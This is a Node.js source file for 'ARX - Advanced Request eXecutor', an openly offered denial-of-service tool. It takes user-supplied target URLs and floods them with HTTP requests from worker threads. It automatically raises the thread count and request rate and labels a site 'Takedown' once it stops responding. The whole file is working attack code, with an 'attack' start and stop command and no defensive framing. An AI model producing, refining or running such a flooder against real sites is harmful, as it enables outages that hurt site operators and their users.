const readline = require("readline");
const { Worker } = require("worker_threads");
const os = require("os");
const http = require("http");
const https = require("https");
const chalk = require("chalk");
const boxen = require("boxen");

console.clear();
console.log(chalk.greenBright.bold("Selamat datang di ARX - Advanced Request eXecutor [AutoScale]"));

const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

let targets = [];
let workers = {};
let stats = {};
let statuses = {};
let threads = {};
let rps = {};

function askURL(index = 0) {
  rl.question(`Target URL #${index + 1} (leave blank to finish): `, async (url) => {
    if (!url.trim()) {
      if (targets.length === 0) return askURL(index);
      return askCommand();
    }
    const isLive = await testTarget(url.trim());
    const cleanUrl = url.trim();
    targets.push(cleanUrl);
    statuses[cleanUrl] = isLive ? "Alive" : "Takedown";
    stats[cleanUrl] = { sent: 0, success: 0, failed: 0, codes: {} };
    threads[cleanUrl] = 1;
    rps[cleanUrl] = 10;
    workers[cleanUrl] = [];
    askURL(index + 1);
  });
}

function askCommand() {
  rl.question('Type "start" to begin attack: ', (input) => {
    if (input.trim().toLowerCase() === "start") {
      console.clear();
      console.log(chalk.greenBright.bold("ARX - Advanced Request eXecutor by: Akashirohman and team\n"));
      startAttack();
    } else {
      askCommand();
    }
  });
}

function testTarget(url) {
  return new Promise((resolve) => {
    const mod = url.startsWith("https") ? https : http;
    const req = mod.get(url, { timeout: 5000 }, (res) => {
      res.resume();
      resolve(true);
    });
    req.on("error", () => resolve(false));
    req.on("timeout", () => {
      req.destroy();
      resolve(false);
    });
  });
}

function createWorker(url) {
  const worker = new Worker("./worker.js", {
    workerData: { target: url, rps: rps[url] },
  });

  worker.on("message", (msg) => {
    if (msg.type === "stats") {
      stats[url].sent += msg.sent;
      stats[url].success += msg.success;
      stats[url].failed += msg.failed;
      for (const code in msg.codes) {
        stats[url].codes[code] = (stats[url].codes[code] || 0) + msg.codes[code];
      }

      // Adaptive scale down if too many 5xx
      const total = Object.values(msg.codes).reduce((a, b) => a + b, 0);
      const errors = Object.entries(msg.codes).filter(([code]) => code.startsWith("5")).reduce((sum, [, val]) => sum + val, 0);
      if (total > 0 && errors / total > 0.5 && threads[url] > 1) {
        threads[url]--;
        rps[url] = Math.max(1, Math.floor(rps[url] * 0.7));
        workers[url].pop()?.postMessage("stop");
      }
    }

    if (msg.type === "error") {
      console.log(chalk.red(`[FAILOVER] Worker error on ${url}: ${msg.error}`));
      restartWorker(url);
    }
  });

  worker.on("error", () => {
    restartWorker(url);
  });

  workers[url].push(worker);
}

function restartWorker(url) {
  createWorker(url);
}

function startAttack() {
  for (const url of targets) {
    for (let i = 0; i < threads[url]; i++) {
      createWorker(url);
    }
  }

  setInterval(() => {
    for (const url of targets) {
      if (statuses[url] === "Takedown") continue;

      if (stats[url].failed < stats[url].sent * 0.3 && threads[url] < os.cpus().length) {
        threads[url]++;
        rps[url] = Math.min(1000, rps[url] + 10);
        createWorker(url);
      }

      if (stats[url].failed > stats[url].success * 2 && stats[url].failed > 100) {
        statuses[url] = "Takedown";
      }
    }
  }, 10000);

  displayStats();
  listenCommand();
}

function displayStats() {
  setInterval(() => {
    const lines = targets.map((url, i) => {
      const s = stats[url];
      const status = statuses[url] === "Alive" ? chalk.greenBright("Alive") : chalk.redBright("Takedown");

      return `[${i}] ${chalk.cyan(url)}\n` +
             `   ${chalk.yellow("Sent")}: ${s.sent} | ${chalk.green("Success")}: ${s.success} | ${chalk.red("Failed")}: ${s.failed} | Threads: ${threads[url]} | RPS: ${rps[url]} | Status: ${status}`;
    });

    const boxed = boxen(lines.join("\n\n"), {
      padding: 1,
      borderColor: "red",
      borderStyle: "round",
    });

    console.clear();
    console.log(chalk.greenBright.bold("ARX - Advanced Request eXecutor by: Akashirohman and team\n"));
    console.log(boxed);
    console.log("Command (stop):");
  }, 1000);
}

function listenCommand() {
  rl.on("line", (line) => {
    if (line.trim().toLowerCase() === "stop") {
      for (const list of Object.values(workers)) {
        for (const worker of list) {
          worker.postMessage("stop");
        }
      }
      console.log(chalk.redBright("\n[STOPPED] All attacks stopped."));
      process.exit(0);
    }
  });
}

askURL();
